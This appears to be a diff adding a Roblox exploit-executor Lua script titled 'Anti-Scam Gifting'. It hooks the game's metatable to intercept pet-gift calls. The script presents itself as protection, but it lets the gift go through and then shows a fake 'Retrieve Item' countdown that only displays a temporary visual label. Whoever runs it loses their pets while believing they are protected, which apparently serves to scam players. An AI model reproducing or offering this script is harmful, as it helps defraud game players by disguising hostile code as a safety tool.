@@ -1,0 +1,120 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+local giftingEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+-- Toggle UI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AntiScamGiftUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 200, 0, 40)
+toggleBtn.Position = UDim2.new(0, 20, 0, 100)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Font = Enum.Font.SourceSansBold
+toggleBtn.TextSize = 20
+toggleBtn.Text = "Anti-Scam Gifting: OFF"
+toggleBtn.Parent = screenGui
+
+local antiScamEnabled = false
+toggleBtn.MouseButton1Click:Connect(function()
+	antiScamEnabled = not antiScamEnabled
+	toggleBtn.Text = "Anti-Scam Gifting: " .. (antiScamEnabled and "ON" or "OFF")
+	toggleBtn.BackgroundColor3 = antiScamEnabled and Color3.fromRGB(40, 160, 90) or Color3.fromRGB(80, 80, 80)
+end)
+
+-- Fake Restore Function
+local function showRetrievePopup(petName)
+	local popup = Instance.new("Frame")
+	popup.Size = UDim2.new(0, 250, 0, 120)
+	popup.Position = UDim2.new(0.5, -125, 0.5, -60)
+	popup.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	popup.BorderSizePixel = 0
+	popup.Parent = screenGui
+
+	local label = Instance.new("TextLabel", popup)
+	label.Size = UDim2.new(1, 0, 0.4, 0)
+	label.Position = UDim2.new(0, 0, 0, 10)
+	label.BackgroundTransparency = 1
+	label.Font = Enum.Font.SourceSansBold
+	label.TextSize = 20
+	label.TextColor3 = Color3.new(1, 1, 1)
+	label.Text = "Retrieving " .. petName .. " in 10s..."
+
+	local retrieveBtn = Instance.new("TextButton", popup)
+	retrieveBtn.Size = UDim2.new(0.8, 0, 0.3, 0)
+	retrieveBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
+	retrieveBtn.Text = "Please wait..."
+	retrieveBtn.Font = Enum.Font.SourceSansBold
+	retrieveBtn.TextSize = 18
+	retrieveBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+	retrieveBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+	retrieveBtn.AutoButtonColor = false
+	retrieveBtn.Active = false
+
+	task.spawn(function()
+		for i = 10, 0, -1 do
+			label.Text = "Retrieving " .. petName .. " in " .. i .. "s..."
+			retrieveBtn.Text = "Please wait (" .. i .. "s)"
+			task.wait(1)
+		end
+
+		label.Text = "Click to retrieve " .. petName
+		retrieveBtn.Text = "Retrieve Item"
+		retrieveBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+		retrieveBtn.TextColor3 = Color3.new(1, 1, 1)
+		retrieveBtn.AutoButtonColor = true
+		retrieveBtn.Active = true
+
+		retrieveBtn.MouseButton1Click:Connect(function()
+			local petLabel = Instance.new("TextLabel")
+			petLabel.Size = UDim2.new(0, 200, 0, 30)
+			petLabel.Position = UDim2.new(0, math.random(50, 400), 1, -40)
+			petLabel.Text = petName .. " (Visual)"
+			petLabel.Font = Enum.Font.SourceSans
+			petLabel.TextSize = 16
+			petLabel.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+			petLabel.TextColor3 = Color3.new(1, 1, 1)
+			petLabel.Parent = screenGui
+
+			TweenService:Create(petLabel, TweenInfo.new(1), {TextTransparency = 0.3}):Play()
+			task.delay(10, function()
+				petLabel:Destroy()
+			end)
+
+			popup:Destroy()
+		end)
+	end)
+end
+
+-- Hook FireServer
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local oldNamecall = mt.__namecall
+
+mt.__namecall = newcclosure(function(self, ...)
+	local args = {...}
+	local method = getnamecallmethod()
+
+	if self == giftingEvent and method == "FireServer" and antiScamEnabled and args[1] == "GivePet" then
+		-- Grab pet name from inventory before it disappears
+		local pets = player:FindFirstChild("Pets")
+		if pets then
+			local petList = pets:GetChildren()
+			if #petList > 0 then
+				local randomPet = petList[math.random(1, #petList)]
+				showRetrievePopup(randomPet.Name)
+			end
+		end
+	end
+
+	return oldNamecall(self, ...)
+end)
+
+setreadonly(mt, true)
